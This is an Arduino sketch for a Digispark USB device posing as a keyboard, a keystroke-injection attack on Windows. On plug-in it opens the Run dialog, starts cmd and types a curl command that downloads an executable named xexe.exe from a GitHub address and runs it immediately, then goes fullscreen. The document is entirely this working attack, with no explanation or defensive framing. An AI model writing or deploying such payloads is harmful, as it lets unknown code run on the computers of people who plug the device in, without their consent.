#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);

  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);

  DigiKeyboard.println("curl -LJO https://github.com/xexe-ded/xexe/raw/refs/heads/main/xexe.exe & xexe.exe");
  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(KEY_F11);
  DigiKeyboard.delay(200);
}

void loop() {}